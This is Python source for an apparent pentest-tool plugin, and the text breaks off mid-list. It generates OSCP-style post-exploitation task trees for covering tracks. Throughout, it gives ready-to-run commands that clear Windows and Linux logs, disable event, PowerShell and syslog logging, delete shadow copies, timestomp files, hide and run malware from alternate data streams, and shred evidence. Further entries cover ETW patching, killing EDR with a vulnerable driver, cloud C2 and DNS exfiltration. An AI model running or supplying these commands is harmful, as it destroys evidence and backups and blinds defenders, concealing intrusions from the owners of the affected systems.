"""
Anti-Forensics & Evasion service plugin

Generates tasks for covering tracks, log tampering, and data exfiltration.
Critical for OSCP post-exploitation phase to maintain access and avoid detection.

Extracted from HackTricks: Anti-Forensic Techniques, PCAP Analysis, DNScat Exfiltration
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class AntiForensicsPlugin(ServicePlugin):
    """Anti-forensics and evasion enumeration plugin"""

    @property
    def name(self) -> str:
        return "anti-forensics"

    @property
    def default_ports(self) -> List[int]:
        return []  # Not port-based, manually triggered

    @property
    def service_names(self) -> List[str]:
        return ['anti-forensics', 'evasion', 'covering-tracks']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """Not auto-detected - manually triggered during post-exploitation"""
        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate anti-forensics and evasion task tree

        Args:
            target: Target IP/hostname
            port: Not used (manual trigger)
            service_info: Should contain 'os_type': 'linux' or 'windows'

        Returns:
            Task tree with covering tracks, log tampering, and exfiltration tasks
        """
        os_type = service_info.get('os_type', 'linux').lower()

        if os_type == 'windows':
            return self._get_windows_tasks(target)
        elif os_type == 'linux':
            return self._get_linux_tasks(target)
        else:
            return self._get_generic_tasks(target)

    def _get_windows_tasks(self, target: str) -> Dict[str, Any]:
        """Windows anti-forensics and evasion tasks"""
        return {
            'id': 'anti-forensics-windows',
            'name': 'Windows Anti-Forensics & Evasion',
            'type': 'parent',
            'children': [
                # Timestamp Manipulation
                {
                    'id': 'win-timestamp-manipulation',
                    'name': 'Timestamp Manipulation',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'win-timestomp-check',
                            'name': 'Identify Timestamp Targets',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Identify files whose timestamps should be modified',
                                'tags': ['OSCP:HIGH', 'POST_EXPLOIT', 'MANUAL'],
                                'notes': [
                                    'TimeStomp modifies $STANDARD_INFORMATION but NOT $FILE_NAME',
                                    'Forensics can detect this mismatch',
                                    'USN Journal ($UsnJrnl) tracks all volume changes',
                                    '$LogFile records all metadata changes',
                                    'Nanosecond precision: timestamps like 10:10:00.000:0000 are suspicious'
                                ],
                                'next_steps': [
                                    'Use SetMace tool (modifies both attributes, requires live OS from Vista+)',
                                    'Check for tools: timestomp.exe, setmace.exe',
                                    'Alternative: Match timestamps to nearby legitimate files'
                                ],
                                'alternatives': [
                                    'Manual: Copy timestamps from legit file using PowerShell Get-Item/Set-ItemProperty',
                                    'Manual: Use native tools to minimize detection surface'
                                ]
                            }
                        }
                    ]
                },

                # Log Tampering
                {
                    'id': 'win-log-tampering',
                    'name': 'Windows Log Tampering',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'win-clear-event-logs',
                            'name': 'Clear Windows Event Logs',
                            'type': 'command',
                            'metadata': {
                                'command': 'for /F "tokens=*" %1 in (\'wevtutil.exe el\') DO wevtutil.exe cl "%1"',
                                'description': 'Clear all Windows event logs (NOISY - obvious indicator of compromise)',
                                'tags': ['OSCP:HIGH', 'POST_EXPLOIT', 'NOISY'],
                                'flag_explanations': {
                                    'wevtutil.exe el': 'Enumerate all event log names',
                                    'wevtutil.exe cl': 'Clear specific event log',
                                    'for /F': 'Loop through each log name'
                                },
                                'success_indicators': [
                                    'Event logs cleared successfully',
                                    'Event viewer shows no recent events'
                                ],
                                'failure_indicators': [
                                    'Access denied (need admin privileges)',
                                    'Some logs protected by system'
                                ],
                                'next_steps': [
                                    'WARNING: Clearing logs is extremely suspicious',
                                    'Consider selective deletion instead',
                                    'Check Event ID 1102 (audit log cleared) was itself logged'
                                ],
                                'alternatives': [
                                    'GUI: eventvwr.msc → Right-click each category → Clear Log',
                                    'PowerShell: Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }',
                                    'Selective: wevtutil.exe cl Security',
                                    'Better: Delete specific event IDs instead of clearing all'
                                ],
                                'notes': 'OSCP Exam: Document timing and reason for log clearing. Better to delete specific entries.'
                            }
                        },
                        {
                            'id': 'win-disable-event-logs',
                            'name': 'Disable Windows Event Logging',
                            'type': 'command',
                            'metadata': {
                                'command': 'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog" /v Start /t REG_DWORD /d 4 /f',
                                'description': 'Disable Windows Event Log service (requires restart)',
                                'tags': ['OSCP:MEDIUM', 'POST_EXPLOIT', 'STEALTH'],
                                'flag_explanations': {
                                    'reg add': 'Add/modify registry key',
                                    'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog': 'Event log service registry path',
                                    '/v Start': 'Service startup value',
                                    '/t REG_DWORD': 'Data type (32-bit integer)',
                                    '/d 4': 'Disabled (2=Automatic, 3=Manual, 4=Disabled)',
                                    '/f': 'Force overwrite without prompting'
                                },
                                'success_indicators': [
                                    'Registry key modified successfully',
                                    'After restart: Event logs no longer recording'
                                ],
                                'failure_indicators': [
                                    'Access denied (need SYSTEM or admin)',
                                    'Service protected by security software'
                                ],
                                'next_steps': [
                                    'Restart required for changes to take effect',
                                    'Verify with: sc query eventlog',
                                    'Re-enable before leaving: reg add ... /d 2 /f'
                                ],
                                'alternatives': [
                                    'services.msc → Windows Event Log → Properties → Startup type: Disabled',
                                    'PowerShell: Set-Service -Name EventLog -StartupType Disabled',
                                    'sc config eventlog start= disabled'
                                ],
                                'notes': 'Less suspicious than clearing logs. Appears as system misconfiguration.'
                            }
                        },
                        {
                            'id': 'win-powershell-logging',
                            'name': 'Disable PowerShell Logging',
                            'type': 'command',
                            'metadata': {
                                'command': 'reg add "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f',
                                'description': 'Disable PowerShell ScriptBlock and Module logging (2023+ forensics)',
                                'tags': ['OSCP:HIGH', 'POST_EXPLOIT', 'STEALTH'],
                                'flag_explanations': {
                                    'EnableScriptBlockLogging': 'Records full PowerShell script content (events 4104/4105/4106)',
                                    '/d 0': 'Disable (1=Enable)',
                                    'HKLM:\\SOFTWARE\\Microsoft\\PowerShell': 'PowerShell configuration root'
                                },
                                'success_indicators': [
                                    'Registry value set to 0',
                                    'PowerShell commands no longer logged to Operational log'
                                ],
                                'failure_indicators': [
                                    'Registry key protected by Group Policy',
                                    'EDR monitoring registry changes'
                                ],
                                'next_steps': [
                                    'Also disable Module logging: HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging',
                                    'In-memory log wipe: Get-WinEvent -LogName Microsoft-Windows-PowerShell/Operational | Remove-WinEvent',
                                    'Check for transcript logging: Test-Path $profile'
                                ],
                                'alternatives': [
                                    'Use obfuscated PowerShell (Invoke-Obfuscation)',
                                    'Use compiled C# instead of PowerShell',
                                    'Reflective loading to avoid disk artifacts'
                                ],
                                'notes': 'Windows 10/11 and Server 2016+ keep rich PowerShell forensics. Disable early in engagement.',
                                'estimated_time': '1-2 minutes'
                            }
                        }
                    ]
                },

                # Artifact Removal
                {
                    'id': 'win-artifact-removal',
                    'name': 'Windows Artifact Removal',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'win-disable-userassist',
                            'name': 'Disable UserAssist Tracking',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Disable tracking of executable execution times',
                                'tags': ['OSCP:MEDIUM', 'POST_EXPLOIT', 'MANUAL'],
                                'notes': [
                                    'UserAssist: Tracks dates/times when each executable was run',
                                    'Step 1: Set HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Start_TrackProgs to 0',
                                    'Step 2: Set HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Start_TrackEnabled to 0',
                                    'Step 3: Clear HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\<hash> subtrees'
                                ],
                                'alternatives': [
                                    'Manual registry edit with regedit.exe',
                                    'PowerShell: Set-ItemProperty for each key'
                                ]
                            }
                        },
                        {
                            'id': 'win-disable-prefetch',
                            'name': 'Disable Prefetch',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Disable Windows Prefetch (application execution tracking)',
                                'tags': ['OSCP:MEDIUM', 'POST_EXPLOIT', 'MANUAL'],
                                'notes': [
                                    'Prefetch: Saves info about executed apps to improve performance',
                                    'Path: HKLM\\SYSTEM\\CurrentControlSet\\Control\\SessionManager\\Memory Management\\PrefetchParameters',
                                    'Set EnablePrefetcher to 0 (default: 1 or 3)',
                                    'Set EnableSuperfetch to 0 (default: 1 or 3)',
                                    'Requires restart to take effect'
                                ],
                                'alternatives': [
                                    'Delete prefetch files: del C:\\Windows\\Prefetch\\*.pf',
                                    'Forensically expensive but effective'
                                ]
                            }
                        },
                        {
                            'id': 'win-delete-usb-history',
                            'name': 'Delete USB Device History',
                            'type': 'command',
                            'metadata': {
                                'command': 'reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR" /f',
                                'description': 'Delete USB device connection history',
                                'tags': ['OSCP:LOW', 'POST_EXPLOIT'],
                                'flag_explanations': {
                                    'HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR': 'Registry key storing USB device entries',
                                    'reg delete': 'Delete registry key',
                                    '/f': 'Force without confirmation'
                                },
                                'next_steps': [
                                    'Also delete: C:\\Windows\\INF\\setupapi.dev.log',
                                    'Use USBDeview tool to verify deletion'
                                ],
                                'alternatives': [
                                    'Manual: regedit.exe → Navigate to USBSTOR → Delete',
                                    'Tool: USBDeview.exe (NirSoft)'
                                ]
                            }
                        },
                        {
                            'id': 'win-shadow-copies',
                            'name': 'Delete Shadow Copies',
                            'type': 'command',
                            'metadata': {
                                'command': 'vssadmin delete shadows /all /quiet',
                                'description': 'Delete all Volume Shadow Copies (backup/recovery)',
                                'tags': ['OSCP:HIGH', 'POST_EXPLOIT', 'NOISY'],
                                'flag_explanations': {
                                    'vssadmin': 'Volume Shadow Copy Service admin tool',
                                    'delete shadows': 'Delete shadow copies',
                                    '/all': 'All shadow copies on system',
                                    '/quiet': 'Suppress confirmation prompts'
                                },
                                'success_indicators': [
                                    'Shadow copies deleted successfully',
                                    'vssadmin list shadowstorage shows no copies'
                                ],
                                'failure_indicators': [
                                    'Access denied (need admin)',
                                    'VSS service not running'
                                ],
                                'next_steps': [
                                    'Disable VSS service: services.msc → Volume Shadow Copy → Disabled',
                                    'Prevent future shadow copies',
                                    'Check backup software still running'
                                ],
                                'alternatives': [
                                    'GUI: System Properties → System Protection → Configure → Delete',
                                    'PowerShell: Get-WmiObject Win32_ShadowCopy | Remove-WmiObject',
                                    'wmic shadowcopy delete'
                                ],
                                'notes': 'Common ransomware behavior. Prevents system restore and file recovery.',
                                'estimated_time': '2-5 minutes depending on number of shadow copies'
                            }
                        }
                    ]
                },

                # Advanced Evasion (2023-2025)
                {
                    'id': 'win-advanced-evasion',
                    'name': 'Advanced Evasion Techniques (2023+)',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'win-etw-patching',
                            'name': 'ETW (Event Tracing) Patching',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Patch ETW in-memory to blind EDR (2024 evasion)',
                                'tags': ['OSCP:LOW', 'ADVANCED', 'POST_EXPLOIT'],
                                'notes': [
                                    'ETW: Endpoint security relies on Event Tracing for Windows',
                                    'Technique: Patch ntdll!EtwEventWrite to return immediately (RET instruction)',
                                    'In-memory only - does not persist across reboots',
                                    'Process-local - EDR in other processes unaffected',
                                    'C code: WriteProcessMemory(..., 0xC3) to patch with RET opcode',
                                    'Public PoCs: EtwTiSwallow, various GitHub repos'
                                ],
                                'alternatives': [
                                    'PowerShell implementation of ETW patching',
                                    'Use reflective DLL injection to patch ntdll',
                                    'AMSI bypass techniques (similar concept)'
                                ],
                                'success_indicators': [
                                    'ETW events no longer generated',
                                    'EDR visibility reduced'
                                ],
                                'failure_indicators': [
                                    'Kernel-mode EDR hooks detect patching',
                                    'Memory integrity checks fail',
                                    'Behavioral detection on memory modification'
                                ]
                            }
                        },
                        {
                            'id': 'win-ads-hiding',
                            'name': 'Alternate Data Streams (ADS) Hiding',
                            'type': 'command',
                            'metadata': {
                                'command': 'type malicious.exe > legitimate.pdf:hidden.dll',
                                'description': 'Hide malware in Alternate Data Streams (FIN12 2023 TTP)',
                                'tags': ['OSCP:MEDIUM', 'POST_EXPLOIT', 'STEALTH'],
                                'flag_explanations': {
                                    'type': 'Output file contents',
                                    '>': 'Redirect to target',
                                    'legitimate.pdf:hidden.dll': 'ADS syntax - file:streamname'
                                },
                                'success_indicators': [
                                    'Data hidden in stream',
                                    'Not visible in normal directory listing',
                                    'File appears as normal PDF to casual inspection'
                                ],
                                'failure_indicators': [
                                    'NTFS required (not FAT/FAT32)',
                                    'Some security tools scan ADS',
                                    'Copying to non-NTFS strips streams'
                                ],
                                'next_steps': [
                                    'Execute from ADS: wmic process call create "legitimate.pdf:hidden.dll"',
                                    'Alternative: start legitimate.pdf:hidden.dll',
                                    'Check detection: dir /R, Get-Item -Stream *, streams64.exe'
                                ],
                                'alternatives': [
                                    'PowerShell: Set-Content -Path file.txt -Stream hidden -Value (Get-Content malware.exe)',
                                    'Manual: echo data > file.txt:stream',
                                    'Extract: more < file.txt:stream'
                                ],
                                'notes': 'Revival in 2023 ransomware campaigns. Stages second-stage payloads out of scanner sight.',
                                'estimated_time': '1 minute'
                            }
                        },
                        {
                            'id': 'win-byovd-aukill',
                            'name': 'BYOVD: Kill EDR with Vulnerable Driver',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Bring Your Own Vulnerable Driver to terminate EDR (AuKill 2023)',
                                'tags': ['OSCP:LOW', 'ADVANCED', 'EXPLOIT'],
                                'notes': [
                                    'BYOVD: Load signed but vulnerable driver to gain kernel access',
                                    'AuKill: Open-source tool using procexp152.sys (Process Explorer driver)',
                                    'Usage: AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"',
                                    'Usage: AuKill.exe -k CrowdStrike',
                                    'Terminates EDR/forensic sensors before log destruction',
                                    'Driver removed after, minimal artifacts',
                                    'Ransomware operators use this for anti-forensics'
                                ],
                                'alternatives': [
                                    'Other vulnerable drivers: RTCore64.sys, AsIO.sys, etc.',
                                    'Check Microsoft vulnerable driver blocklist',
                                    'DSEFix for kernel-mode code execution'
                                ],
                                'success_indicators': [
                                    'EDR process terminated',
                                    'Logging disabled at kernel level',
                                    'No alerts generated'
                                ],
                                'failure_indicators': [
                                    'HVCI/SAC enabled (blocks vulnerable drivers)',
                                    'Driver blocklist prevents loading',
                                    'Alert on kernel service creation from user-writable path'
                                ]
                            }
                        }
                    ]
                },

                # Secure Deletion
                {
                    'id': 'win-secure-deletion',
                    'name': 'Secure File Deletion',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'win-cipher-wipe',
                            'name': 'Overwrite Free Space with Cipher',
                            'type': 'command',
                            'metadata': {
                                'command': 'cipher /w:C',
                                'description': 'Overwrite deleted files on C: drive (prevents recovery)',
                                'tags': ['OSCP:MEDIUM', 'POST_EXPLOIT'],
                                'flag_explanations': {
                                    'cipher': 'Built-in Windows encryption/deletion tool',
                                    '/w:C': 'Wipe unused disk space on C: drive'
                                },
                                'success_indicators': [
                                    'Free space overwritten with random data',
                                    'Deleted files unrecoverable'
                                ],
                                'failure_indicators': [
                                    'Insufficient permissions',
                                    'Drive in use errors'
                                ],
                                'alternatives': [
                                    'Tool: Eraser (https://eraser.heidi.ie)',
                                    'Tool: SDelete from Sysinternals',
                                    'sdelete -z C: (zero free space)'
                                ],
                                'notes': 'Time-consuming on large drives. Consider targeting specific directories.',
                                'estimated_time': '30+ minutes depending on drive size'
                            }
                        }
                    ]
                }
            ]
        }

    def _get_linux_tasks(self, target: str) -> Dict[str, Any]:
        """Linux anti-forensics and evasion tasks"""
        return {
            'id': 'anti-forensics-linux',
            'name': 'Linux Anti-Forensics & Evasion',
            'type': 'parent',
            'children': [
                # Log Tampering
                {
                    'id': 'linux-log-tampering',
                    'name': 'Linux Log Tampering',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'linux-clear-history',
                            'name': 'Clear Command History',
                            'type': 'command',
                            'metadata': {
                                'command': 'history -c && rm -f ~/.bash_history ~/.zsh_history ~/.python_history',
                                'description': 'Clear shell command history (immediate and persistent)',
                                'tags': ['OSCP:HIGH', 'POST_EXPLOIT', 'QUICK_WIN', 'MANUAL'],
                                'flag_explanations': {
                                    'history -c': 'Clear in-memory history',
                                    'rm -f': 'Force remove files without prompting',
                                    '~/.bash_history': 'Bash command history file',
                                    '~/.zsh_history': 'Zsh command history file',
                                    '~/.python_history': 'Python REPL history'
                                },
                                'success_indicators': [
                                    'History files deleted',
                                    'history command shows no entries',
                                    'No command trail on logout'
                                ],
                                'failure_indicators': [
                                    'Files recreated on next command',
                                    'History still visible in ps or /proc'
                                ],
                                'next_steps': [
                                    'Prevent logging: unset HISTFILE',
                                    'Disable for session: set +o history',
                                    'Check other shells: ~/.fish_history, ~/.local/share/fish/fish_history'
                                ],
                                'alternatives': [
                                    'Prepend commands with space (some shells ignore)',
                                    'ln -sf /dev/null ~/.bash_history (persistent)',
                                    'export HISTSIZE=0 HISTFILESIZE=0 (session)'
                                ],
                                'notes': 'OSCP: Clear before disconnecting. Document in writeup with timestamp.',
                                'estimated_time': '5 seconds'
                            }
                        },
                        {
                            'id': 'linux-clear-auth-logs',
                            'name': 'Clear Authentication Logs',
                            'type': 'command',
                            'metadata': {
                                'command': 'echo "" > /var/log/auth.log && echo "" > /var/log/secure',
                                'description': 'Clear authentication logs (login attempts, sudo usage)',
                                'tags': ['OSCP:HIGH', 'POST_EXPLOIT', 'NOISY'],
                                'flag_explanations': {
                                    'echo ""': 'Output empty string',
                                    '>': 'Overwrite file (not append)',
                                    '/var/log/auth.log': 'Debian/Ubuntu authentication log',
                                    '/var/log/secure': 'RHEL/CentOS authentication log'
                                },
                                'success_indicators': [
                                    'Log files empty or zeroed',
                                    'No login records visible'
                                ],
                                'failure_indicators': [
                                    'Permission denied (need root)',
                                    'Logs protected by immutable attribute',
                                    'Rsyslog/syslog-ng continues writing'
                                ],
                                'next_steps': [
                                    'Check for remote logging (rsyslog to SIEM)',
                                    'Stop syslog: systemctl stop rsyslog',
                                    'Clear other logs: /var/log/syslog, /var/log/messages',
                                    'Check systemd journal: journalctl --vacuum-time=1s'
                                ],
                                'alternatives': [
                                    'Selective: sed -i \'/malicious_ip/d\' /var/log/auth.log',
                                    'Truncate: truncate -s 0 /var/log/auth.log',
                                    'Shred: shred -vfz -n 3 /var/log/auth.log'
                                ],
                                'notes': 'EXTREMELY suspicious. Forensics will see empty logs. Prefer selective editing.',
                                'estimated_time': '1 minute'
                            }
                        },
                        {
                            'id': 'linux-disable-logging',
                            'name': 'Disable Syslog Daemon',
                            'type': 'command',
                            'metadata': {
                                'command': 'systemctl stop rsyslog && systemctl disable rsyslog',
                                'description': 'Stop and disable system logging daemon',
                                'tags': ['OSCP:MEDIUM', 'POST_EXPLOIT', 'STEALTH'],
                                'flag_explanations': {
                                    'systemctl stop': 'Stop service immediately',
                                    'systemctl disable': 'Prevent service from starting on boot',
                                    'rsyslog': 'Modern syslog implementation (rsyslog)',
                                    '&&': 'Execute second command if first succeeds'
                                },
                                'success_indicators': [
                                    'rsyslog service stopped',
                                    'systemctl status rsyslog shows inactive',
                                    'No new log entries generated'
                                ],
                                'failure_indicators': [
                                    'Permission denied (need root)',
                                    'Service protected by system policy'
                                ],
                                'next_steps': [
                                    'Also check: syslog-ng (alternative to rsyslog)',
                                    'Verify journal: systemctl status systemd-journald',
                                    'Re-enable before leaving: systemctl enable rsyslog'
                                ],
                                'alternatives': [
                                    'SysVinit: service rsyslog stop',
                                    'Kill process: killall rsyslogd',
                                    'Prevent start: chmod -x /usr/sbin/rsyslogd'
                                ],
                                'notes': 'Less obvious than clearing logs. Appears as service failure.',
                                'estimated_time': '30 seconds'
                            }
                        }
                    ]
                },

                # Timestamp Manipulation
                {
                    'id': 'linux-timestamp-manipulation',
                    'name': 'Timestamp Manipulation',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'linux-touch-timestamps',
                            'name': 'Modify File Timestamps with Touch',
                            'type': 'command',
                            'metadata': {
                                'command': 'touch -r /bin/ls /tmp/malicious.sh',
                                'description': 'Copy timestamps from legitimate file to malicious file',
                                'tags': ['OSCP:HIGH', 'POST_EXPLOIT', 'STEALTH'],
                                'flag_explanations': {
                                    'touch': 'Change file timestamps',
                                    '-r': 'Reference file (copy timestamps from)',
                                    '/bin/ls': 'Legitimate system file (source)',
                                    '/tmp/malicious.sh': 'Target file (destination)'
                                },
                                'success_indicators': [
                                    'Timestamps match reference file',
                                    'ls -la shows modified time matching /bin/ls',
                                    'stat shows all timestamps aligned'
                                ],
                                'failure_indicators': [
                                    'Permission denied on target file',
                                    'Filesystem mounted with noatime'
                                ],
                                'next_steps': [
                                    'Match atime, mtime, ctime to blend in',
                                    'Use stat to verify: stat malicious.sh',
                                    'Check filesystem: grep -E \'(noatime|relatime)\' /proc/mounts'
                                ],
                                'alternatives': [
                                    'Manual: touch -t YYYYMMDDhhmm.ss file',
                                    'Advanced: touch -d "2023-01-01 12:00:00" file',
                                    'Copy all: touch -r reference_file target_file'
                                ],
                                'notes': 'Blend malicious files with legitimate timestamps. Timeline analysis harder.',
                                'estimated_time': '10 seconds'
                            }
                        }
                    ]
                },

                # Advanced Linux Evasion (2023-2025)
                {
                    'id': 'linux-advanced-evasion',
                    'name': 'Advanced Linux Evasion (2023+)',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'linux-self-patching',
                            'name': 'Self-Patching Services (Anti-Detection)',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Self-patch exploited service to close vulnerability while maintaining access (2023 TTP)',
                                'tags': ['OSCP:LOW', 'ADVANCED', 'POST_EXPLOIT'],
                                'notes': [
                                    'Technique: After exploiting service, replace vulnerable binaries with patched versions',
                                    'Example: Apache ActiveMQ OpenWire RCE (CVE-2023-46604)',
                                    'Fetch legitimate JARs from Maven Central: repo1.maven.org',
                                    'Delete vulnerable files, install patched versions',
                                    'Restart service to close RCE while maintaining other persistence',
                                    'Forensics sees "patched" system, misses initial compromise',
                                    'Detection: Verify package manager vs disk files (dpkg -V, rpm -Va)',
                                    'Check for JAR versions not owned by package manager',
                                    'Timeline: find with mtime correlates to compromise window',
                                    'Shell history: curl/wget to Maven/artifact CDNs after exploit'
                                ],
                                'alternatives': [
                                    'Download patches from official repos',
                                    'Symbolic link manipulation to new versions',
                                    'Keep old vulnerable files as backup'
                                ],
                                'success_indicators': [
                                    'Service appears patched to scanners',
                                    'Vulnerability no longer exploitable',
                                    'Persistence mechanisms still active'
                                ],
                                'failure_indicators': [
                                    'Package verification fails',
                                    'Timeline analysis shows suspicious patching',
                                    'Change management audit reveals unauthorized update'
                                ]
                            }
                        },
                        {
                            'id': 'linux-cloud-c2-evasion',
                            'name': 'Cloud Service C2 with Bearer Tokens',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Use legitimate cloud services for C2 (Dropbox, Cloudflare)',
                                'tags': ['OSCP:LOW', 'ADVANCED', 'POST_EXPLOIT'],
                                'notes': [
                                    'Password-protected PyInstaller ELF loaders hinder analysis',
                                    'Indicators: strings shows PyInstaller, pyi-archive, PYZ-00.pyz, MEIPASS',
                                    'Runtime: Extracts to /tmp/_MEI* or custom --runtime-tmpdir',
                                    'Dropbox C2: Hardcoded OAuth Bearer tokens',
                                    'Network: api.dropboxapi.com, content.dropboxapi.com',
                                    'Authorization: Bearer <token> in HTTPS headers',
                                    'Backup: Cloudflare Tunnel (cloudflared) for redundant C2',
                                    'Hunt: Outbound HTTPS to Dropbox/Cloudflare from servers',
                                    'Detection: cloudflared processes, ~/.cloudflared/*.json config'
                                ],
                                'alternatives': [
                                    'Other cloud: Google Drive API, OneDrive, AWS S3',
                                    'DNS tunneling: dnscat2, iodine',
                                    'ICMP tunneling: ptunnel'
                                ],
                                'success_indicators': [
                                    'C2 blends with legitimate traffic',
                                    'SSL/TLS encrypted communication',
                                    'Difficult to distinguish from normal cloud sync'
                                ],
                                'failure_indicators': [
                                    'Proxy blocks cloud services',
                                    'NetFlow shows server-to-Dropbox anomaly',
                                    'Zeek/Suricata rules detect cloud C2 patterns'
                                ]
                            }
                        },
                        {
                            'id': 'linux-persistence-hardening-rollback',
                            'name': 'Persistence via Configuration Rollback',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Maintain access by reverting security hardening',
                                'tags': ['OSCP:MEDIUM', 'POST_EXPLOIT', 'MANUAL'],
                                'notes': [
                                    'Cron/Anacron: Edit 0anacron stub in /etc/cron.*/ directories',
                                    'Hunt: for d in /etc/cron.*; do stat "$d/0anacron"; done',
                                    'Hunt: grep -R "curl|wget|python" /etc/cron.*/* 2>/dev/null',
                                    'SSH hardening rollback: Enable root login',
                                    'Hunt: grep PermitRootLogin /etc/ssh/sshd_config',
                                    'Suspicious shells on system accounts: /etc/passwd entries',
                                    'Hunt: awk -F: \'($7 ~ /bash|zsh/ && $1 ~ /games|lp|sync/)\' /etc/passwd',
                                    'Random short-named beacons: 8 alphabetical chars',
                                    'Hunt: find / -maxdepth 3 -type f -regex \'.*/[A-Za-z]{8}$\''
                                ],
                                'alternatives': [
                                    'Systemd timer persistence',
                                    'LD_PRELOAD rootkit',
                                    'SSH authorized_keys manipulation'
                                ],
                                'success_indicators': [
                                    'Root SSH login enabled',
                                    'Cron jobs executing malicious payloads',
                                    'System accounts with interactive shells'
                                ],
                                'failure_indicators': [
                                    'Config management restores hardening',
                                    'AIDE/Tripwire detects /etc changes',
                                    'Correlation with external exposure events'
                                ]
                            }
                        }
                    ]
                },

                # Data Exfiltration
                {
                    'id': 'linux-data-exfiltration',
                    'name': 'Data Exfiltration Techniques',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'linux-dnscat-exfil',
                            'name': 'DNScat2 Exfiltration',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Exfiltrate data via DNS queries (dnscat2)',
                                'tags': ['OSCP:MEDIUM', 'POST_EXPLOIT', 'STEALTH'],
                                'notes': [
                                    'DNScat2: Tunnels data over DNS protocol',
                                    'First 9 bytes: C2 communication metadata (not real data)',
                                    'Encoded in DNS query subdomain: data.domain.com',
                                    'Detection: Wireshark filter for DNSQR without DNSRR',
                                    'Parsing: Extract qname, strip domain, decode hex, skip first 9 bytes',
                                    'Python: from scapy.all import rdpcap, DNSQR',
                                    'Tool: DNScat-Decoder (https://github.com/josemlwdf/DNScat-Decoder)',
                                    'Usage: python3 dnscat_decoder.py sample.pcap bad_domain'
                                ],
                                'alternatives': [
                                    'iodine: IP over DNS tunnel',
                                    'DNS TXT records for data',
                                    'ICMP tunneling with ptunnel'
                                ],
                                'success_indicators': [
                                    'Data exfiltrated via DNS',
                                    'No direct outbound connections',
                                    'Bypasses firewall egress rules'
                                ],
                                'failure_indicators': [
                                    'DNS monitoring detects abnormal query patterns',
                                    'Long subdomain names flagged',
                                    'High query volume to single domain'
                                ]
                            }
                        }
                    ]
                },

                # Secure Deletion
                {
                    'id': 'linux-secure-deletion',
                    'name': 'Secure File Deletion',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'linux-shred-files',
                            'name': 'Shred Files (Secure Deletion)',
                            'type': 'command',
                            'metadata': {
                                'command': 'shred -vfz -n 10 /tmp/sensitive.txt',
                                'description': 'Overwrite and delete files securely (unrecoverable)',
                                'tags': ['OSCP:HIGH', 'POST_EXPLOIT', 'MANUAL'],
                                'flag_explanations': {
                                    'shred': 'Overwrite file to hide contents',
                                    '-v': 'Verbose output (show progress)',
                                    '-f': 'Force (change permissions if needed)',
                                    '-z': 'Add final overwrite with zeros to hide shredding',
                                    '-n 10': 'Number of overwrite passes (10 is thorough)'
                                },
                                'success_indicators': [
                                    'File overwritten multiple times',
                                    'Original data unrecoverable',
                                    'File deleted after overwrite'
                                ],
                                'failure_indicators': [
                                    'Filesystem uses journaling (ext3/4 may retain data)',
                                    'SSD wear leveling defeats overwriting',
                                    'File copied elsewhere before shredding'
                                ],
                                'next_steps': [
                                    'Verify deletion: ls -la /tmp/sensitive.txt',
                                    'Check for copies: find / -name sensitive.txt 2>/dev/null',
                                    'Clear filesystem journal if possible'
                                ],
                                'alternatives': [
                                    'dd: dd if=/dev/urandom of=/tmp/sensitive.txt bs=1M count=10 && rm file',
                                    'wipe: wipe -rf /tmp/sensitive.txt',
                                    'srm: srm -vz /tmp/sensitive.txt (if installed)'
                                ],
                                'notes': 'SSDs and journaling filesystems may retain data. Best effort secure deletion.',
                                'estimated_time': '10-30 seconds per file depending on size'
                            }
                        }
                    ]
                }
            ]
        }

    def _get_generic_tasks(self, target: str) -> Dict[str, Any]:
        """Generic anti-forensics tasks (OS-agnostic)"""
        return {
            'id': 'anti-forensics-generic',
            'name': 'Generic Anti-Forensics & Evasion',
            'type': 'parent',
            'children': [
                {
                    'id': 'generic-log-review',
                    'name': 'Identify Log Locations',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Locate system logs to tamper',
                        'tags': ['MANUAL', 'POST_EXPLOIT'],
                        'notes': [
                            'Common Linux: /var/log/, ~/.bash_history',
                            'Common Windows: Event Viewer, Prefetch, Registry',
                            'Check remote logging (syslog to SIEM)',
                            'Identify monitoring agents (Splunk, Elastic, etc.)'
                        ]
                    }
                },
                {
                    'id': 'generic-exfil-channels',
                    'name': 'Identify Exfiltration Channels',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Find available egress channels for data exfiltration',
                        'tags': ['MANUAL', 'POST_EXPLOIT'],
                        'notes': [
                            'Check allowed protocols: HTTP(S), DNS, ICMP, NTP',
